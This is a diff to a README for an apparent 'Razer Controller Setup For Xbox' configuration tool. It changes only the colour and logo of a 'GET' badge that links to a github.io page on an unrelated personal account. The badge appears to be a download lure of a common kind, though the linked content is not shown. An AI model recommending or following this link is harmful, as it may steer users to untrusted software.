@@ -1,6 +1,6 @@
 # Razer Controller Setup For Xbox — Controller Configuration Tool
 
-[![GET — Razer Controller Setup For Xbox](https://img.shields.io/badge/GET%20%E2%80%94%20Razer%20Controller%20Setup%20For%20Xbox-1B5E20?style=for-the-badge&logo=playstation&logoColor=white)](https://careyvicki.github.io/.github/Razer-Controller)
+[![GET — Razer Controller Setup For Xbox](https://img.shields.io/badge/GET%20%E2%80%94%20Razer%20Controller%20Setup%20For%20Xbox-0078D6?style=for-the-badge&logoColor=white)](https://careyvicki.github.io/.github/Razer-Controller)
 
 ## About Razer Controller Setup For Xbox
 
